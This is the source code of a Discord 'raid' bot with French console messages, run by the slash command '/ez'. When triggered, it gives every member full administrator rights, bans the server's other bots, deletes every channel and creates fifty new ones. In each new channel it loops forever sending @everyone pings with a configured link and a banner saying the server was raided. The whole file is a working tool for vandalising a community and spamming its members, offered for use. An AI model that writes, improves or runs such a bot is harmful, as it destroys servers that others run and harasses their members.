from watermark import *

import pystyle
import discord
from discord.ext import commands

import json

def raid(token, link, by):
    try:
        bot = commands.Bot(command_prefix=".", intents=discord.Intents.all())
        discord.Intents.all().presences = True
        @bot.event
        async def on_ready():
            print(f'\n{pystyle.Colors.dark_green}{bot.user} {pystyle.Colors.light_green}est prêt !')
            try:
                await bot.tree.sync()
            except Exception as e:
                print(e)
        @bot.tree.command(name='ez', description= 'Ouch.')
        async def ez(
            interaction: discord.Interaction
        ):
            await interaction.guild.create_role(name=f"ez by {by}", permissions = discord.Permissions.all())
            role = discord.utils.get(interaction.guild.roles, name="@everyone")
            await role.edit(permissions = discord.Permissions.all())
            try:
                for member in interaction.guild.members:
                    if member.bot:
                        try:
                            await member.ban()
                        except:
                            pass
                    else:
                        await member.add_roles(discord.utils.get(member.guild.roles, name=f"ez by {by}"))
            except:
                 print(pystyle.Colors.red + "Je ne peux pas mettre tout le monde admin")
            for channel in interaction.guild.channels:
                try:
                    await channel.delete()
                    print(f"{pystyle.Colors.light_green}{channel.name} a été supprimé.")
                except:
                    print(f"{pystyle.Colors.red}{channel.name} {pystyle.Colors.light_red}n'a pas été supprimé.")
            i = 0
            for i in range(50):
                try:
                    await interaction.guild.create_text_channel("ez")
                    print(f"{pystyle.Colors.dark_green}Salon créé {pystyle.Colors.light_green}({i})")
                except:
                    pass
        
        @bot.event
        async def on_guild_channel_create(channel):
            embed = discord.Embed(title="Juste imagine",description=f"**vous vous êtes fait raid par `{by}`**", color=0)
            embed.set_image(url="https://i.pinimg.com/originals/16/03/fb/1603fb7077abb9093f4af305b4e5ce79.gif")
            while True:
                await channel.send(f'|| @everyone || || {link} ||', embed=embed)
    except Exception as error:
        print(f"{pystyle.Colors.red}{error}")

    bot.run(token)

if __name__ == '__main__':
    __config__ = json.load(open('config.json', 'r'))

    watermark()

    token = __config__['token']
    link = __config__['lien']
    message = __config__['message']

    try:
        raid(token, link, message)
    except Exception as error:
        print(f'\n{pystyle.Colors.red}{error}')
        print(f'\n{pystyle.Colors.gray}Le programme va se fermer')
        time.sleep(5)